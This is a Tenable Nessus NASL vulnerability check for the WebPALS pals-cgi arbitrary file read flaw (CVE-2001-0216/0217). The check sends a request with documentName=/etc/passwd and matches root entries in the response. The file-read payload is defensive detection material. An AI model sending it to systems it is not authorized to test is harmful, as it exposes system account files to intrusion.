#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10611);
 script_version ("$Revision: 1.19 $");
 script_cve_id("CVE-2001-0216", "CVE-2001-0217");
 script_bugtraq_id(2372);
 script_xref(name:"OSVDB", value:"507");
 script_xref(name:"OSVDB", value:"15394");
 
 script_name(english:"PALS Library System WebPALS pals-cgi Multiple Vulnerabilities");
 
 script_set_attribute(attribute:"synopsis", value:
"It is possible to read arbitrary files from the remote 
system." );
 script_set_attribute(attribute:"description", value:
"The 'pals-cgi' CGI is installed. This CGI has a well known
security flaw that lets an attacker read arbitrary files
with the privileges of the http daemon (usually root or 
nobody)." );
 script_set_attribute(attribute:"solution", value:
"Remove it from /cgi-bin." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N" );

script_end_attributes();

 
 script_summary(english:"Checks for the presence of /cgi-bin/pals-cgi");
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2001-2009 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

foreach dir (cgi_dirs())
{
  r = http_send_recv3(port:port, method:"GET", item:"/pals-cgi?palsAction=restart&documentName=/etc/passwd");
  if(isnull(r) ) exit(1, "Null response to pals-cgi request.");
  if(egrep(pattern:".*root:.*:0:[01]:.*", string:r[2]))security_hole(port);
}
